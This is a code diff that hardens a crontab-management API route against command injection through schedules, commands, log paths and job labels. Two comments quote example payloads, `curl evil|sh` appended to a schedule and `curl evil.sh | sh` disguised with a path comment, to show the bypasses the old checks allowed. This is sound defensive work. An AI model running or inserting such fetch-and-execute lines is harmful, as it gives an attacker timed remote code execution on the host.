@@ -3,12 +3,18 @@ import * as fs from "fs";
 import { join } from "path";
 
 import { logApiError, serverErrorFromError } from "@/lib/api-logger";
-import { requireAuth, isReadOnly } from "@/lib/api-auth";
+import { requireAuth, requireAuthenticatedHostWrites, isReadOnly } from "@/lib/api-auth";
 import { parseJsonBody } from "@/lib/parse-json-body";
 import { badRequest, notFound, ok, serverErrorFromHelperResult, serviceUnavailable } from "@/lib/api-response";
-import { crontabLineUsesScriptsDir } from "@/lib/hardware-cron";
+import {
+  crontabLineUsesScriptsDir,
+  expandHomeInString,
+  normalizeHardwareCronPath,
+} from "@/lib/hardware-cron";
 import { getHostScheduler } from "@/lib/host-scheduler";
 import { getPsScriptsDir, getPsHardwareLogDir, PS_DATA_DIR } from "@/lib/paths";
+import { interpreterFor } from "@/lib/platform";
+import { resolveScriptPath } from "@/lib/scripts-manager";
 
 /**
  * Hardware Cron API — System crontab management
@@ -100,21 +106,97 @@ function applyDisabledChange(
 }
 
 /**
- * Return a 400 NextResponse if `command` is set and doesn't run a script
- * under the CH scripts dir. Returns null when the command is acceptable
- * (or undefined — in which case the caller is not editing the command
- * field and the check is skipped). Shared between POST (create) and PUT
- * (update).
+ * A job label becomes a `# <name>` comment line in the crontab, so a newline in
+ * it writes an arbitrary extra crontab line. Collapse all whitespace.
  */
-function rejectIfBadScriptsCommand(command: string | undefined): NextResponse | null {
-  if (command === undefined) return null;
-  const scriptsDir = getPsScriptsDir();
-  if (!crontabLineUsesScriptsDir(command, scriptsDir)) {
-    return badRequest(
-      `Command must run a script under ${scriptsDir} (PatterStage hardware cron scripts directory).`,
-    );
+function sanitiseCronName(name: string | undefined): string | undefined {
+  if (!name) return undefined;
+  const flat = name.replace(/\s+/g, " ").trim().slice(0, 120);
+  return flat || undefined;
+}
+
+/** POSIX single-quote a path so spaces and metacharacters cannot break out. */
+function shellQuote(value: string): string {
+  return `'${value.replace(/'/g, `'\\''`)}'`;
+}
+
+/**
+ * Every crontab field must be cron syntax and nothing else. Without this a
+ * "5 fields" check passes `* * * * *;curl evil|sh` — the count is right and the
+ * payload rides along into the user's crontab.
+ */
+const CRON_FIELD_RE = /^[0-9*,\-/]+$/;
+
+function rejectIfBadSchedule(schedule: string): NextResponse | null {
+  const fields = schedule.trim().split(/\s+/);
+  if (fields.length !== 5) {
+    return badRequest("Schedule must have exactly 5 fields: min hour dom mon dow");
+  }
+  if (!fields.every((f) => CRON_FIELD_RE.test(f))) {
+    return badRequest("Schedule fields may contain only digits, * , - and /");
   }
   return null;
+}
+
+/**
+ * Rebuild the command PatterStage will install, from scratch.
+ *
+ * The previous check was `line.includes(scriptsDir + "/")` — a substring test,
+ * so `curl evil.sh | sh  # /home/me/patterstage/data/scripts/` passed it and
+ * became a crontab line. Validating attacker-controlled text is the wrong
+ * shape of solution: instead we take ONLY the script's basename out of the
+ * caller's input, resolve it under the scripts dir (which rejects traversal and
+ * non-existent files), and regenerate the command from the interpreter map.
+ * Anything else the caller supplied is discarded rather than approved.
+ */
+function canonicaliseScriptsCommand(
+  input: string,
+): { ok: true; command: string; scriptName: string } | { ok: false; response: NextResponse } {
+  const scriptsDir = getPsScriptsDir();
+  const bad = (msg: string) => ({ ok: false as const, response: badRequest(msg) });
+
+  // A path token ending in a script extension, or a bare basename.
+  const match = input.match(/(?:^|[\s'"])([^\s'"]*[/\\])?([^\s/\\'"]+\.(?:sh|mjs|cjs|js))\b/i);
+  const scriptName = match?.[2];
+  if (!scriptName) {
+    return bad("Command must name a script (.sh, .mjs, .cjs or .js) from the PatterStage scripts directory.");
+  }
+
+  // If the caller named a DIRECTORY, it must be the scripts dir. Rebuilding
+  // `~/.hermes/scripts/x.mjs` into `<scriptsDir>/x.mjs` would be safe but would
+  // silently run a different file than the operator asked for.
+  const dirPart = match?.[1];
+  if (dirPart) {
+    const given = normalizeHardwareCronPath(expandHomeInString(dirPart));
+    if (given !== normalizeHardwareCronPath(scriptsDir)) {
+      return bad(`Scripts must live in ${scriptsDir}; '${dirPart}' is outside it.`);
+    }
+  }
+
+  const abs = resolveScriptPath(scriptName);
+  if (!abs) {
+    return bad(`'${scriptName}' is not an existing script in the PatterStage hardware scripts directory.`);
+  }
+
+  const interpreter = interpreterFor(abs);
+  if (!interpreter) return bad(`No interpreter is available for '${scriptName}' on this platform.`);
+
+  void scriptsDir; // resolveScriptPath already anchors to it; kept for clarity of intent
+  const command = [interpreter.cmd, ...interpreter.args].map(shellQuote).join(" ");
+  return { ok: true, command, scriptName };
+}
+
+/**
+ * Constrain the log target to a plain filename inside the hardware log dir.
+ * `logFile` is interpolated into the crontab line as `>> <logFile> 2>&1`, so an
+ * unconstrained value is the same injection hole as the command was.
+ */
+function resolveCronLogFile(requested: string | undefined, entryId: string): string | null {
+  const logDir = getPsHardwareLogDir();
+  if (!requested) return `${logDir}/${entryId}.log`;
+  const base = requested.split(/[/\\]/).pop() ?? "";
+  if (!base || !/^[A-Za-z0-9._-]+\.log$/.test(base)) return null;
+  return `${logDir}/${base}`;
 }
 
 /**
@@ -254,6 +336,9 @@ export async function GET(request: NextRequest) {
 export async function POST(request: NextRequest) {
   const auth = requireAuth(request);
   if (auth) return auth;
+  // Installing a crontab line makes the host execute code on a timer.
+  const hostWrites = requireAuthenticatedHostWrites();
+  if (hostWrites) return hostWrites;
   if (isReadOnly()) {
     return serviceUnavailable("PatterStage is in read-only mode");
   }
@@ -303,24 +388,22 @@ export async function POST(request: NextRequest) {
       return badRequest("schedule and command are required");
     }
 
-    // Basic cron validation — 5 fields
-    const fields = schedule.trim().split(/\s+/);
-    if (fields.length !== 5) {
-      return badRequest("Schedule must have exactly 5 fields: min hour dom mon dow");
-    }
+    const badSchedule = rejectIfBadSchedule(schedule);
+    if (badSchedule) return badSchedule;
 
-    const badCmd = rejectIfBadScriptsCommand(command);
-    if (badCmd) return badCmd;
+    const canonical = canonicaliseScriptsCommand(command);
+    if (!canonical.ok) return canonical.response;
 
     const crontab = await readCrontab();
     const lines = crontab.split("\n");
 
     // Check if this script already has an entry (replace if so)
-    const scriptName = extractScriptName(command);
-    const entryId = scriptName.replace(SCRIPT_EXT_RE, "") || "hw";
+    const entryId = canonical.scriptName.replace(SCRIPT_EXT_RE, "") || "hw";
 
-    const logDir = getPsHardwareLogDir();
-    const newLine = serialiseLine(schedule, command, logFile || `${logDir}/${entryId}.log`);
+    const resolvedLog = resolveCronLogFile(logFile, entryId);
+    if (!resolvedLog) return badRequest("logFile must be a plain '*.log' filename.");
+    const safeName = sanitiseCronName(name);
+    const newLine = serialiseLine(schedule, canonical.command, resolvedLog);
     const newLines: string[] = [];
     let replaced = false;
 
@@ -328,8 +411,8 @@ export async function POST(request: NextRequest) {
       const parsed = parseCrontabLine(line);
       if (parsed && parsed.id === entryId) {
         // Replace existing entry for this script
-        if (name) {
-          newLines.push(`# ${name}`);
+        if (safeName) {
+          newLines.push(`# ${safeName}`);
         }
         newLines.push(newLine);
         replaced = true;
@@ -339,8 +422,8 @@ export async function POST(request: NextRequest) {
     }
 
     if (!replaced) {
-      if (name) {
-        newLines.push(`# ${name}`);
+      if (safeName) {
+        newLines.push(`# ${safeName}`);
       }
       newLines.push(newLine);
     }
@@ -352,7 +435,8 @@ export async function POST(request: NextRequest) {
       return serverErrorFromHelperResult(result, "unknown error");
     }
 
-    return ok({ id: entryId, schedule, command, name, logFile });
+    // Echo what was actually installed, not what was asked for.
+    return ok({ id: entryId, schedule, command: canonical.command, name: safeName, logFile: resolvedLog });
   } catch (e: unknown) {
     return serverErrorFromError("POST /api/cron/hardware", "create hardware cron", e, "Failed to create hardware cron job");
   }
@@ -361,6 +445,9 @@ export async function POST(request: NextRequest) {
 export async function PUT(request: NextRequest) {
   const auth = requireAuth(request);
   if (auth) return auth;
+  // Installing a crontab line makes the host execute code on a timer.
+  const hostWrites = requireAuthenticatedHostWrites();
+  if (hostWrites) return hostWrites;
   if (isReadOnly()) {
     return serviceUnavailable("PatterStage is in read-only mode");
   }
@@ -383,11 +470,17 @@ export async function PUT(request: NextRequest) {
       return badRequest("id is required");
     }
 
+    if (schedule !== undefined) {
+      const badSchedule = rejectIfBadSchedule(schedule);
+      if (badSchedule) return badSchedule;
+    }
+
     const crontab = await readCrontab();
     const disabledIds = loadDisabledIds();
     const lines = crontab.split("\n");
     const newLines: string[] = [];
     let found = false;
+    let rewriteError: NextResponse | null = null;
 
     // Separate: only toggle changes JSON; schedule/command/name changes rewrite crontab
     const isToggleOnly =
@@ -397,22 +490,36 @@ export async function PUT(request: NextRequest) {
       name === undefined &&
       logFile === undefined;
 
+    const safeName = sanitiseCronName(name);
+
     for (const line of lines) {
       const parsed = parseCrontabLine(line);
       if (parsed && parsed.id === id) {
         found = true;
-        const newSchedule = schedule || parsed.schedule;
-        const newCommand = command || parsed.command;
-        const newLogFile = logFile || parsed.logFile;
 
         // Only rewrite crontab for non-toggle changes
         if (!isToggleOnly) {
+          const newSchedule = schedule || parsed.schedule;
+          // Re-derive the command every time we rewrite, from the caller's input
+          // or from what is already installed — never trust either verbatim.
+          const canonical = canonicaliseScriptsCommand(command || parsed.command);
+          if (!canonical.ok) {
+            rewriteError = canonical.response;
+            newLines.push(line);
+            continue;
+          }
+          const newLogFile = resolveCronLogFile(logFile ?? parsed.logFile, id);
+          if (!newLogFile) {
+            rewriteError = badRequest("logFile must be a plain '*.log' filename.");
+            newLines.push(line);
+            continue;
+          }
           // Remove preceding comment if it was for this entry
           if (newLines.length > 0 && newLines[newLines.length - 1].startsWith("# ")) {
             newLines.pop();
           }
-          if (name) newLines.push(`# ${name}`);
-          newLines.push(serialiseLine(newSchedule, newCommand, newLogFile));
+          if (safeName) newLines.push(`# ${safeName}`);
+          newLines.push(serialiseLine(newSchedule, canonical.command, newLogFile));
         }
       } else {
         newLines.push(line);
@@ -422,9 +529,7 @@ export async function PUT(request: NextRequest) {
     if (!found) {
       return notFound(`Hardware cron job '${id}' not found`);
     }
-
-    const badCmd = rejectIfBadScriptsCommand(command);
-    if (badCmd) return badCmd;
+    if (rewriteError) return rewriteError;
 
     // Toggle-only: update JSON state (UI). On Windows also enable/disable the
     // scheduled task; no-op on Unix where the JSON is the source of truth.
@@ -453,6 +558,9 @@ export async function PUT(request: NextRequest) {
 export async function DELETE(request: NextRequest) {
   const auth = requireAuth(request);
   if (auth) return auth;
+  // Installing a crontab line makes the host execute code on a timer.
+  const hostWrites = requireAuthenticatedHostWrites();
+  if (hostWrites) return hostWrites;
   if (isReadOnly()) {
     return serviceUnavailable("PatterStage is in read-only mode");
   }
